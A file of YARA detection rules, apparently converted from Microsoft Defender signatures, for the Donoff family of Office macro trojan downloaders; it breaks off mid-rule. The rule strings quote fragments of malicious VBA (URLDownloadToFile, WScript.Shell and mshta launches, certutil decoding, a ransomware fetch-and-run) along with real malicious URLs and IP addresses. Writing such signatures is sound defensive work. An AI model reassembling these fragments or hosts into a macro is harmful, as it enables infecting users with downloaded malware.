rule TrojanDownloader_O97M_Donoff_PW_2147734006_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.PW"
        threat_id = "2147734006"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"*&87873jnhjhsJJHGGF==+++\"" ascii //weight: 1
        $x_1_2 = "\"HGHGhwegrbce74546567\"" ascii //weight: 1
        $x_1_3 = "\"3485erjtghhgFDFDGJKJhjhe\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_PX_2147734635_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.PX"
        threat_id = "2147734635"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {45 6e 76 69 72 6f 6e 28 22 54 45 4d 50 22 29 20 26 20 22 5c [0-10] 2e 74 78 74 22 2c 20 32 3a 20 62 20 3d 20 35}  //weight: 1, accuracy: Low
        $x_1_2 = {53 70 6c 69 74 28 54 68 69 73 57 6f 72 6b 62 6f 6f 6b 2e 53 68 65 65 74 73 28 22 [0-5] 22 29 2e 52 61 6e 67 65 28 22 [0-5] 22 29 2e 56 61 6c 75 65 2c 20 43 68 72 28 28 28 28}  //weight: 1, accuracy: Low
        $x_1_3 = "& Chr(Int(Chr(38) & Chr(72) & Mid(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_BSA_2147735783_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BSA"
        threat_id = "2147735783"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= Shell(sCL, vbHide)" ascii //weight: 1
        $x_1_2 = {68 74 74 70 3a 2f 2f 66 69 6c 65 72 [0-1] 2e 31 61 70 70 73 2e 63 6f 6d 2f 31 2e 74 78 74}  //weight: 1, accuracy: Low
        $x_1_3 = "%TEMP% && ct -decode -f 1.txt 1.bat" ascii //weight: 1
        $x_1_4 = "&& del /f /q 1.txt && 1.bat" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_BSB_2147735784_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BSB"
        threat_id = "2147735784"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub ViewCloseAll()" ascii //weight: 1
        $x_1_2 = {3d 20 46 53 4f 2e 47 65 74 53 70 65 63 69 61 6c 46 6f 6c 64 65 72 28 32 29 20 26 20 22 5c 32 30 31 39 [0-7] 2e 64 6f 63 22}  //weight: 1, accuracy: Low
        $x_1_3 = "objWinHttp.send \"\"" ascii //weight: 1
        $x_1_4 = "= 4198 Then MsgBox \"Document was not closed\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_QA_2147740293_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.QA"
        threat_id = "2147740293"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 73 61 76 65 74 6f 66 69 6c 65 20 22 [0-4] 2e 65 22 20 26 20 22 78 65 22 2c 20 32 0d 0a 45 78 65 63 75 74 65 45 78 63 65 6c 34 4d 61 63 72 6f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_QB_2147740790_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.QB"
        threat_id = "2147740790"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"bin\" & \".ba\" & \"se64\"" ascii //weight: 1
        $x_1_2 = "Environ(\"Temp\") & \"\\.Adobe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_QB_2147740790_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.QB"
        threat_id = "2147740790"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub Auto_Open()" ascii //weight: 1
        $x_2_2 = {47 65 74 46 69 6c 65 4f 6e 28 22 48 74 54 50 3a 2f 2f 61 66 67 63 6c 6f 75 64 37 2e 63 6f 6d 2f 75 70 6c 64 2f [0-16] 2e [0-5] 22 2c 20 45 6e 76 69 72 6f 6e 28 22 61 70 70 64 61 74 61 22 29 20 26 20 22 [0-16] 2e 73 63 72 22 29}  //weight: 2, accuracy: Low
        $x_2_3 = {43 61 6c 6c 20 53 76 69 65 72 28 45 6e 76 69 72 6f 6e 28 22 61 70 70 64 61 74 61 22 29 20 26 20 22 [0-16] 2e 73 63 72 22 2c 20 76 62 48 69 64 65 29}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_QC_2147740798_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.QC"
        threat_id = "2147740798"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Environ(\"AppData\") & \"\\\" &" ascii //weight: 1
        $x_1_2 = "= Shell(\"wscr\" & \"ipt \" &" ascii //weight: 1
        $x_1_3 = ".Wait (Now + TimeValue(\"0:00:10\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_QC_2147740798_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.QC"
        threat_id = "2147740798"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "Sub Auto_Open()" ascii //weight: 1
        $x_3_2 = {47 65 74 46 69 6c 65 4f 6e 28 22 [0-32] 3a 2f 2f 74 68 65 2e [0-16] 65 61 72 74 68 2e 6c 69 [0-16] 2f 7e 73 67 74 61 74 68 61 6d [0-16] 2f 70 75 [0-16] 74 74 79 2f 6c 61 74 65 [0-16] 73 74 [0-16] 2f 78 38 36 2f 70 [0-16] 75 74 74 79 [0-16] 2e [0-16] 65 [0-16] 78 [0-16] 65 22 2c 20 45 6e 76 69 72 6f 6e 28 22 [0-16] 22 29 20 26 20 22 5c [0-32] 2e 65 78 65 22 29 20 3d 20 54 72 75 65}  //weight: 3, accuracy: Low
        $x_3_3 = {43 61 6c 6c 20 53 76 69 65 72 28 45 6e 76 69 72 6f 6e 28 22 [0-16] 22 29 20 26 20 22 5c [0-32] 2e 65 78 65 22 2c 20 76 62 48 69 64 65 29}  //weight: 3, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_3_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_BF_2147741166_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BF"
        threat_id = "2147741166"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 57 69 6e 45 78 65 63 28 22 63 6d 64 22 20 26 20 [0-10] 20 26 20 22 2f 43 22 20 26 20 [0-10] 20 26 20 [0-10] 2c 20 [0-10] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 [0-3] 20 2b 20 22 2e 65 78 65 22 2c 20 54 72 75 65 29}  //weight: 1, accuracy: Low
        $x_1_3 = "Sub DocEntry()" ascii //weight: 1
        $x_1_4 = "-----BEGIN CERTIFICATE-----" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_DL_2147741431_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DL"
        threat_id = "2147741431"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_4_1 = "http://51.75.133.165" ascii //weight: 4
        $x_4_2 = "Windows\\\\Temp\\\\MicrosoftOfficeWord.exe\"" ascii //weight: 4
        $x_2_3 = {3d 20 22 43 3a 5c 5c 57 69 6e 64 6f 77 73 5c 5c 54 65 6d 70 5c 5c [0-32] 2e 65 78 65 22}  //weight: 2, accuracy: Low
        $x_2_4 = "URLDownloadToFile Lib \"urlmon\"" ascii //weight: 2
        $x_2_5 = "URLDownloadToFile(0, getUrl, getPth, 0, 0)" ascii //weight: 2
        $x_2_6 = {43 61 6c 6c 20 53 68 65 6c 6c 28 [0-16] 29}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((4 of ($x_2_*))) or
            ((1 of ($x_4_*) and 2 of ($x_2_*))) or
            ((2 of ($x_4_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_PI_2147742016_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.PI"
        threat_id = "2147742016"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {78 48 74 74 70 2e 4f 70 65 6e 20 22 47 45 54 22 2c 20 22 68 74 74 70 [0-2] 3a 2f 2f [0-48] 2f [0-32] 2e 65 78 65 22 2c 20 46 61 6c 73 65}  //weight: 1, accuracy: Low
        $x_1_2 = ".savetofile \"LooCipher.exe\", 2" ascii //weight: 1
        $x_1_3 = "Shell (\"LooCipher.exe\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_PL_2147742017_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.PL"
        threat_id = "2147742017"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "xHttp.Open \"GET\", \"http" ascii //weight: 1
        $x_1_2 = {2e 73 61 76 65 74 6f 66 69 6c 65 20 22 [0-16] 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_3 = {53 68 65 6c 6c 20 28 22 [0-16] 2e 65 78 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_PG_2147742018_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.PG"
        threat_id = "2147742018"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = {2e 6e 61 76 69 67 61 74 65 20 28 22 68 74 74 70 [0-2] 3a 2f 2f 39 32 2e 33 38 2e 31 33 35 2e 39 39 2f [0-32] 2e 74 78 74 22 29}  //weight: 3, accuracy: Low
        $x_3_2 = {2e 6e 61 76 69 67 61 74 65 20 28 22 68 74 74 70 [0-2] 3a 2f 2f 32 37 2e 31 30 32 2e 31 30 32 2e 32 33 35 2f [0-32] 2e 74 78 74 22 29}  //weight: 3, accuracy: Low
        $x_1_3 = "= \"output.pdf" ascii //weight: 1
        $x_1_4 = "= \"Retract.dll" ascii //weight: 1
        $x_1_5 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 2e 45 78 65 63 20 28 22 72 75 6e 64 6c 6c 33 32 20 22 20 2b 20 [0-32] 20 26 20 22 2c 47 65 74 32 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_3_*) and 2 of ($x_1_*))) or
            ((2 of ($x_3_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_PD_2147742498_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.PD"
        threat_id = "2147742498"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Right(\"In side we gonna see ReeVeDWScript\", 7) & \".\" & Left(\"Shellinshala\", 5)" ascii //weight: 1
        $x_1_2 = "VBA.CallByName Jerk, \"RUN\", VbMethod, moniker, Gats" ascii //weight: 1
        $x_1_3 = "= ThisDocument.Content.Text" ascii //weight: 1
        $x_1_4 = "Application.StartupPath & \"\\s\" & \"e.\" & Chr(110 - 2 - 2) & \"se" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_PE_2147742522_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.PE"
        threat_id = "2147742522"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 22 53 22 20 26 20 [0-16] 20 26 20 22 72 69 70 74}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 56 42 41 2e 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 53 68 [0-16] 65 6c 6c 2e 41 70 70 6c 69 22 20 26 20 [0-16] 20 26 20 22 61 74 69 6f 6e 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {56 42 41 2e 43 61 6c 6c 42 79 4e 61 6d 65 20 4f 62 6a 2c 20 22 53 68 65 22 20 26 20 22 6c 6c 45 78 65 22 20 26 20 [0-16] 20 26 20 22 75 74 65 22 2c 20 56 62 4d 65 74 68 6f 64 2c 20 22 57 22 20 26}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_PF_2147742537_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.PF"
        threat_id = "2147742537"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= VBA.Environ(\"AppData\") & \"\\Microsoft\\Excel\\" ascii //weight: 1
        $x_1_2 = "= \"update.txt" ascii //weight: 1
        $x_1_3 = {2e 53 61 76 65 54 6f 46 69 6c 65 20 [0-16] 2c 20 32}  //weight: 1, accuracy: Low
        $x_1_4 = {2e 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 53 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 2e 52 75 6e 20 28 22 63 73 63 72 69 70 74 20 2f 2f 45 3a 6a 73 63 72 69 70 74 20 22 20 26 20 [0-16] 29 2c 20 30}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_DM_2147742649_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DM"
        threat_id = "2147742649"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 75 62 20 [0-10] 28 [0-10] 29 [0-10] 20 3d 20 [0-10] 20 2d 20 04 00 [0-10] 20 3d 20 [0-10] 20 2b 20 [0-10] 28 [0-10] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {46 75 6e 63 74 69 6f 6e 20 [0-10] 29 [0-10] 20 3d 20 [0-10] 20 2d 20 [0-16] 20 3d 20 22 [0-10] 22 [0-10] 20 3d 20 43 68 72 28 [0-10] 29 [0-10] 20 3d 20 [0-10] 20 2b 20 [0-10] 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_5_3 = {53 75 62 20 41 75 74 6f 4f 70 65 6e 28 29 [0-16] 20 04 00 [0-16] 20 04 00 [0-16] 20 04 00 [0-16] 20 04 00 [0-16] 20 04 00 [0-16] 20 04 00 [0-16] 20 04 00}  //weight: 5, accuracy: Low
        $x_5_4 = "CreateObject(\"WScript.Shell\").Run" ascii //weight: 5
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_5_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_PJ_2147742854_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.PJ"
        threat_id = "2147742854"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= ActiveDocument.AttachedTemplate.Path & \"\\12345\" & \".dota:of" ascii //weight: 1
        $x_1_2 = "= Mid(\"The xoshell?\", 7, 5)" ascii //weight: 1
        $x_1_3 = "= Mid(\"Are Descript?\", 7, 6)" ascii //weight: 1
        $x_1_4 = "Put #SIMol, , ActiveDocument.Content.Text" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_PK_2147742856_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.PK"
        threat_id = "2147742856"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= ActiveDocument.AttachedTemplate.Path & \"\\\" & \"doc.are:you" ascii //weight: 1
        $x_1_2 = {20 20 50 75 74 20 23 [0-16] 2c 20 2c 20 41 63 74 69 76 65 44 6f 63 75 6d 65 6e 74 2e 43 6f 6e 74 65 6e 74 2e 54 65 78 74}  //weight: 1, accuracy: Low
        $x_1_3 = {43 61 6c 6c 42 79 4e 61 6d 65 28 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-16] 20 26 20 22 2e 22 20 26 20 [0-16] 29 2c 20 [0-48] 2c 20 56 62 4d 65 74 68 6f 64 2c}  //weight: 1, accuracy: Low
        $x_1_4 = "Private Sub Document_Open()" ascii //weight: 1
        $x_1_5 = "Private Sub Document_Close()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147742926_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff!MSR"
        threat_id = "2147742926"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Public Sub Auto_Open" ascii //weight: 1
        $x_1_2 = "var0 = \"msHTa https://ppam.sslblindado.com/pande.html\"" ascii //weight: 1
        $x_1_3 = "VaR = var0" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_2147742926_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff!MSR"
        threat_id = "2147742926"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "sse)cor)P_2)3ni)W:2)vmi)c\\t)oor):st)mgm)niw" ascii //weight: 1
        $x_1_2 = "l)m)t)h).)s)m)\\)c)i)l)b)u)p)\\)s)r)e)s)u)\\):)C)|)m)o)c).)s)m)\\)c)i)l)b)u)p)\\)s)r)e)s)u)\\):)C)|)e)x)e).)a)t)h)s)m)\\)2)3)m)e)t)s)y)s)\\)s)w)o)d)n)i)w)\\):)c)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_P_2147743141_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.P!MSR"
        threat_id = "2147743141"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"MSHTA https://www.oratoriostsurukyo.com.br/arquivos/teste.hta" ascii //weight: 1
        $x_1_2 = "= objWMIService.Get(\"Win32_ProcessStartup\")" ascii //weight: 1
        $x_1_3 = "= objWMIService.Get(\"Win32_Process\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_P_2147743141_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.P!MSR"
        threat_id = "2147743141"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Chr$(99) & Chr$(101) & Chr$(114) & Chr$(116) & Chr$(117) & Chr$(116) & Chr$(105) & Chr$(108) & Chr$(32) & Chr$(45) & Chr$(100) & Chr$(101) & Chr$(99) & Chr$(111) & Chr$(100) & Chr$(101) & Chr$(32) & Chr$(45) & Chr$(102) & Chr$(32)" ascii //weight: 1
        $x_1_2 = "= ecu1op & cfiles & \"image005.jpg \" & cfiles & \"K7UI.dll\"" ascii //weight: 1
        $x_1_3 = "= objProcess.Create(cfiles & \"Intel.exe\", Null, objConfig, intProcessID)" ascii //weight: 1
        $x_1_4 = "strComputer = \".\"" ascii //weight: 1
        $x_1_5 = "Set objStartup = objWMIService.Get(\"Win32_ProcessStartup\")" ascii //weight: 1
        $x_1_6 = "objConfig.ShowWindow = HIDDEN_WINDOW" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SJ_2147743242_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SJ!MSR"
        threat_id = "2147743242"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= ActiveDocument.Range" ascii //weight: 1
        $x_1_2 = "\".jse\"" ascii //weight: 1
        $x_1_3 = "Randomize" ascii //weight: 1
        $x_1_4 = "Rnd &" ascii //weight: 1
        $x_1_5 = "= CreateObject(\"Scripting.FileSystemObject\")" ascii //weight: 1
        $x_1_6 = {43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 [0-25] 2c 20 54 72 75 65 2c 20 54 72 75 65 29}  //weight: 1, accuracy: Low
        $x_1_7 = "CreateObject(\"Shell.Application\")" ascii //weight: 1
        $x_1_8 = ".ShellExecute" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_SD_2147744540_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.SD!MSR"
        threat_id = "2147744540"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 57 72 69 74 65 4c 69 6e 65 20 28 22 73 74 61 72 74 20 63 3a 5c 52 65 73 6f 75 72 63 65 73 5c [0-5] 2e 65 78 65 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 43 72 65 61 74 65 54 65 78 74 46 69 6c 65 28 22 63 3a 5c 52 65 73 6f 75 72 63 65 73 5c [0-15] 2e 63 6d 64 22 2c 20 54 72 75 65 29}  //weight: 1, accuracy: Low
        $x_1_3 = {43 72 65 61 74 65 50 72 6f 63 65 73 73 41 28 30 26 2c 20 22 63 3a 5c 52 65 73 6f 75 72 63 65 73 5c [0-15] 2e 63 6d 64 22 2c}  //weight: 1, accuracy: Low
        $x_1_4 = "= \"Please restart your Office aplication\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_DU_2147744624_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.DU!MSR"
        threat_id = "2147744624"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
